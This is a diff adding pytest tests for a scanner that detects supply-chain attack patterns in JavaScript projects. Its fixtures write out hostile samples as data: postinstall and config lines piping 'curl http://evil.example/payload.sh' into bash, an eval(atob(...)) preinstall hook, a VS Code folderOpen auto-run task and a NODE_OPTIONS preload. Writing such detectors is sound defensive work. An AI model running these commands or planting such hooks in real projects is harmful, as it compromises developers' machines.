@@ -16,6 +16,7 @@ from polinrider_guard import (  # noqa: E402
     scan_clock_tamper,
     scan_commit_camouflage,
     scan_ioc,
+    scan_js_ecosystem,
     scan_masquerade,
     scan_padding,
     scan_vscode,
@@ -509,3 +510,179 @@ def test_commit_camouflage_scanner_respects_allowlist(tmp_path):
 
     _write_allowlist(repo, f"commit_camouflage|{commit_hash[:12]}|known-good reformat sweep, reviewed")
     assert scan_commit_camouflage.scan_path(repo) == []
+
+
+def test_js_ecosystem_scanner_clean():
+    assert scan_js_ecosystem.scan_path(CLEAN) == []
+
+
+def test_js_ecosystem_scanner_clean_on_ordinary_lifecycle_script(tmp_path):
+    # husky-style prepare script -- routine, not suspicious content, so it's
+    # reported (stage 1 always surfaces lifecycle scripts for review) but at
+    # low severity rather than as an alarm.
+    (tmp_path / "package.json").write_text(
+        '{"name": "app", "scripts": {"prepare": "husky install"}}\n'
+    )
+    findings = scan_js_ecosystem.scan_path(tmp_path)
+    assert len(findings) == 1
+    assert findings[0].stage == "stage1_install_lifecycle"
+    assert findings[0].severity == "low"
+
+
+def test_js_ecosystem_scanner_finds_suspicious_postinstall(tmp_path):
+    (tmp_path / "package.json").write_text(
+        '{"name": "app", "scripts": {'
+        '"postinstall": "curl http://evil.example/payload.sh | bash"'
+        '}}\n'
+    )
+    findings = scan_js_ecosystem.scan_path(tmp_path)
+    assert len(findings) == 1
+    assert findings[0].stage == "stage1_install_lifecycle"
+    assert findings[0].severity == "critical"
+    assert any("pipes it directly into an interpreter" in i for i in findings[0].indicators)
+
+
+def test_js_ecosystem_scanner_ignores_clean_dependency_lifecycle_script(tmp_path):
+    # A dependency declaring postinstall is routine (native builds, husky,
+    # puppeteer's Chromium download, ...) -- only flagged when its content
+    # is actually suspicious, not merely present.
+    dep_dir = tmp_path / "node_modules" / "some-pkg"
+    dep_dir.mkdir(parents=True)
+    (dep_dir / "package.json").write_text(
+        '{"name": "some-pkg", "scripts": {"postinstall": "node ./scripts/build.js"}}\n'
+    )
+    assert scan_js_ecosystem.scan_path(tmp_path) == []
+
+
+def test_js_ecosystem_scanner_finds_suspicious_dependency_lifecycle_script(tmp_path):
+    dep_dir = tmp_path / "node_modules" / "@scope" / "evil-pkg"
+    dep_dir.mkdir(parents=True)
+    (dep_dir / "package.json").write_text(
+        '{"name": "@scope/evil-pkg", "scripts": {'
+        '"preinstall": "node -e \\"eval(atob(process.env.X))\\""'
+        '}}\n'
+    )
+    findings = scan_js_ecosystem.scan_path(tmp_path)
+    assert len(findings) == 1
+    assert findings[0].severity == "critical"
+    assert "node_modules" in findings[0].file
+
+
+def test_js_ecosystem_scanner_finds_vscode_allow_automatic_tasks(tmp_path):
+    vscode_dir = tmp_path / ".vscode"
+    vscode_dir.mkdir()
+    (vscode_dir / "settings.json").write_text('{"task.allowAutomaticTasks": "on"}\n')
+    findings = scan_js_ecosystem.scan_path(tmp_path)
+    assert len(findings) == 1
+    assert findings[0].stage == "stage2_ide_autorun"
+    assert findings[0].severity == "high"
+
+
+def test_js_ecosystem_scanner_escalates_allow_automatic_tasks_with_folder_open(tmp_path):
+    vscode_dir = tmp_path / ".vscode"
+    vscode_dir.mkdir()
+    (vscode_dir / "settings.json").write_text('{"task.allowAutomaticTasks": "on"}\n')
+    (vscode_dir / "tasks.json").write_text(
+        '{"tasks": [{"label": "setup", "command": "node", "args": ["setup.js"],'
+        ' "runOptions": {"runOn": "folderOpen"}}]}\n'
+    )
+    findings = scan_js_ecosystem.scan_path(tmp_path)
+    assert len(findings) == 1
+    assert findings[0].severity == "critical"
+    assert any("folderOpen task exists" in i for i in findings[0].indicators)
+
+
+def test_js_ecosystem_scanner_finds_node_options_in_env_file(tmp_path):
+    (tmp_path / ".env").write_text("NODE_OPTIONS=--require ./scripts/preload.js\nPORT=3000\n")
+    findings = scan_js_ecosystem.scan_path(tmp_path)
+    assert len(findings) == 1
+    assert findings[0].stage == "stage3_process_preload"
+    assert findings[0].category == "env_node_options"
+    assert findings[0].severity == "high"
+
+
+def test_js_ecosystem_scanner_ignores_env_sample_files(tmp_path):
+    (tmp_path / ".env.example").write_text("NODE_OPTIONS=--require ./scripts/preload.js\n")
+    assert scan_js_ecosystem.scan_path(tmp_path) == []
+
+
+def test_js_ecosystem_scanner_ignores_ordinary_require_flag_in_script(tmp_path):
+    # `--require ts-node/register` is an ordinary, legitimate pattern (mocha,
+    # ts-node, etc.) -- a bare package/module name target shouldn't be
+    # flagged, only a path-shaped one (see the path-shaped test below).
+    (tmp_path / "package.json").write_text(
+        '{"name": "app", "scripts": {"test": "mocha --require ts-node/register"}}\n'
+    )
+    assert scan_js_ecosystem.scan_path(tmp_path) == []
+
+
+def test_js_ecosystem_scanner_finds_path_shaped_preload_target_in_script(tmp_path):
+    (tmp_path / "package.json").write_text(
+        '{"name": "app", "scripts": {"start": "node --require ./hidden/init.js index.js"}}\n'
+    )
+    findings = scan_js_ecosystem.scan_path(tmp_path)
+    assert len(findings) == 1
+    assert findings[0].stage == "stage3_process_preload"
+    assert findings[0].category == "npm_script_preload"
+
+
+def test_js_ecosystem_scanner_finds_framework_config_download_exec(tmp_path):
+    (tmp_path / "next.config.js").write_text(
+        "const { execSync } = require('child_process');\n"
+        "execSync('curl http://evil.example/x.sh | bash');\n"
+        "module.exports = {};\n"
+    )
+    findings = scan_js_ecosystem.scan_path(tmp_path)
+    assert len(findings) == 1
+    assert findings[0].stage == "stage4_framework_config"
+    assert findings[0].severity == "critical"
+
+
+def test_js_ecosystem_scanner_low_severity_for_lone_network_reference_in_config(tmp_path):
+    # A framework config merely referencing a URL string (CDN domain
+    # allowlist, image loader remote pattern, etc.) is completely ordinary --
+    # only an actual network *call* at load time is flagged, and alone (no
+    # child_process alongside it) that's low severity, not an alarm.
+    (tmp_path / "vite.config.js").write_text(
+        "fetch('https://example.com/telemetry').catch(() => {});\n"
+        "export default {};\n"
+    )
+    findings = scan_js_ecosystem.scan_path(tmp_path)
+    assert len(findings) == 1
+    assert findings[0].severity == "low"
+
+
+def test_js_ecosystem_scanner_clean_on_ordinary_framework_config(tmp_path):
+    (tmp_path / "tailwind.config.js").write_text(
+        "module.exports = { content: ['./src/**/*.{js,jsx}'], theme: {} };\n"
+    )
+    assert scan_js_ecosystem.scan_path(tmp_path) == []
+
+
+def test_js_ecosystem_scanner_finds_suspicious_entry_point(tmp_path):
+    (tmp_path / "package.json").write_text(
+        '{"name": "app", "scripts": {"start": "node -e \\"eval(process.env.X)\\""}}\n'
+    )
+    findings = scan_js_ecosystem.scan_path(tmp_path)
+    stage5 = [f for f in findings if f.stage == "stage5_entry_point"]
+    assert len(stage5) == 1
+    assert stage5[0].severity == "high"
+
+
+def test_js_ecosystem_scanner_ignores_ordinary_entry_point(tmp_path):
+    (tmp_path / "package.json").write_text(
+        '{"name": "app", "scripts": {"dev": "next dev", "build": "next build", "start": "next start"}}\n'
+    )
+    assert scan_js_ecosystem.scan_path(tmp_path) == []
+
+
+def test_js_ecosystem_scanner_respects_allowlist(tmp_path):
+    (tmp_path / "package.json").write_text(
+        '{"name": "app", "scripts": {'
+        '"postinstall": "curl http://evil.example/payload.sh | bash"'
+        '}}\n'
+    )
+    assert len(scan_js_ecosystem.scan_path(tmp_path)) == 1
+
+    _write_allowlist(tmp_path, "js_ecosystem_attack|package.json|reviewed, intentional")
+    assert scan_js_ecosystem.scan_path(tmp_path) == []
